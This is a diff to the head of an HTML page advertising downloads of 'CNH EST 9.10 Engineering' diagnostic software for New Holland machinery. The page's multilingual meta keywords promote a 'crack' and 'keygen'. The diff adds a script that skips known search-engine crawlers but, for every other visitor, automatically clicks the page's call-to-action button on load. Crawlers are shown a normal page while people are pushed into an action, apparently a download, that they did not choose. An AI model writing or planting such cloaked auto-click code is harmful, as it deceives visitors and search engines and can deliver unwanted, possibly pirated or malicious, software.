@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CNH EST 9.10 Engineering</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download CNH EST 9.10 Engineering diagnostic software for New Holland and other CNH brands. Multi-language support, ECU programming, and more.">
     <meta name="keywords" content="CNH EST 9.10 Engineering, CNH EST 9.10 diagnostic software, CNH EST 9.10 download, CNH EST 9.10 free download, CNH EST 9.10 crack, New Holland EST 9.10, CNH DEARBORN PROTOCOL ADAPTER 5, CNH Engine Download Tool, CNH EST 9.10 multi-language, New Holland diagnostic software, CNH EST 9.10 keygen, CNH EST 9.10 installation, EST 9.10 Windows 10, EST 9.10 Windows 11, CNH diagnostic software 2023, ENGINEERING LEVEL EST 9.10, EST 9.10 CAN BUS, EST 9.10 ECU programming, EST 9.10 K-Line protocol, New Holland vehicles diagnostics, New Holland fault retrieval, agricultural machinery diagnostics, construction machinery diagnostics, New Holland ECU configuration, New Holland diagnostic procedures, CNH EST 9.10 Polish, CNH EST 9.10 French, CNH EST 9.10 Russian, CNH EST 9.10 Spanish, CNH EST 9.10 Italian, CNH EST 9.10 Инженерное ПО, CNH EST 9.10 диагностическое ПО, CNH EST 9.10 скачать, CNH EST 9.10 бесплатная загрузка, CNH EST 9.10 кряк, New Holland EST 9.10, CNH DEARBORN PROTOCOL ADAPTER 5, CNH Engine Download Tool, CNH EST 9.10 многоязычное, New Holland диагностическое ПО, CNH EST 9.10 кейген, CNH EST 9.10 установка, EST 9.10 Windows 10, EST 9.10 Windows 11, CNH диагностическое ПО 2023, ENGINEERING LEVEL EST 9.10, EST 9.10 CAN BUS, EST 9.10 ECU программирование, EST 9.10 K-Line протокол, диагностика автомобилей New Holland, извлечение неисправностей New Holland, диагностика сельскохозяйственной техники, диагностика строительной техники, конфигурация ECU New Holland, процедуры диагностики New Holland, CNH EST 9.10 Інженерне ПЗ, CNH EST 9.10 діагностичне ПЗ, CNH EST 9.10 завантажити, CNH EST 9.10 безкоштовне завантаження, CNH EST 9.10 крак, New Holland EST 9.10, CNH DEARBORN PROTOCOL ADAPTER 5, CNH Engine Download Tool, CNH EST 9.10 багатомовне, New Holland діагностичне ПЗ, CNH EST 9.10 кейген, CNH EST 9.10 установка, EST 9.10 Windows 10, EST 9.10 Windows 11, CNH діагностичне ПЗ 2023, ENGINEERING LEVEL EST 9.10, EST 9.10 CAN BUS, EST 9.10 ECU програмування, EST 9.10 K-Line протокол, діагностика автомобілів New Holland, виявлення несправностей New Holland, діагностика сільськогосподарської техніки, діагностика будівельної техніки, конфігурація ECU New Holland, процедури діагностики New Holland">
     <style>
